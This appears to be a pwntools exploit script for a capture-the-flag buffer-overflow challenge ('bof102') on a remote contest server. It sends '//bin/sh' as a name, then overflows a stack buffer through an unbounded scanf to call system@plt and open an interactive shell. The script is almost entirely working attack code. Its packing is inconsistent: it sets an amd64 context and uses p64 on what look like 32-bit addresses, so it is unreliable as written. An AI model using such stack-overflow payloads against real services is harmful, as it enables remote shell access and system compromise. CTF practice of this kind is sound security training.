from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof102')
# r= e.process()
r = remote('bof102.sstf.site', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

  # puts("What's your name?");
  # printf("Name > ");
  # __isoc99_scanf("%16s", name);
  # printf("Hello, %s.\n", name);
  # puts("Do you wanna build a snowman?");
  # printf(" > ");
  # __isoc99_scanf("%s", v1);
  # printf("!!!%s!!!\n", v1);
  
sysplt=0x8048430
r.sendlineafter(b"Name > ",b"//bin/sh")

payload = b"".ljust(16, b"a")+b"b"*4+p64(sysplt)+p32(0x804A06C)
pause()
r.sendlineafter(b" > ",payload)


r.interactive()
